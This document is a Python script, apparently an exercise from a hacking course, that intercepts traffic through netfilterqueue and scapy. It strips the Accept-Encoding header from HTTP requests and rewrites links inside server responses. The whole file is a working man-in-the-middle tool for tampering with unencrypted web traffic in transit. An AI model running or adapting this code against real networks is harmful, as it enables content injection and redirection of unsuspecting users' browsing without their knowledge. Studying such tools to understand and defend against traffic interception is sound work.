#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
from termcolor import colored
import re, signal, sys

def def_handler(sig, frame):
    print(colored("\n[!] Saliendo...\n", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def set_load(packet, load):
    packet[scapy.Raw].load = load # Cambiar la carga original del paquete, por la modificada, sin el Accept-Encoding

    # Borramos len y chksum para evitar problemas de validacion
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) # Hacemos a los paquetes en cola un paquete IP con scapy

    if scapy_packet.haslayer(scapy.Raw): # Que tenga la capa Raw
        try:
            if scapy_packet[scapy.TCP].dport == 80: # Si el destination port (dport) es 80 es que es una solicitud
                modified_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load) # Le estamso diciendo con una regex que en la cabecera de la solicitud me borre el campo Accept
                new_packet = set_load(scapy_packet, modified_load) # Esta funcion debe retornar un paquete con los datos ya alterados
                packet.set_payload(new_packet.build()) # Cambiamos el paquete original por el paquete alterado
            elif scapy_packet[scapy.TCP].sport == 80: # Si el source port (sport) es 80 es que es la respuesta del servidor
                modified_load = scapy_packet[scapy.Raw].load.replace(b'<a href="https://www.acunetix.com/vulnerability-scanner/">', b'<a href="https://hack4u.io">')
                new_packet = set_load(scapy_packet, modified_load)
                packet.set_payload(new_packet.build())
        except:
            pass

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
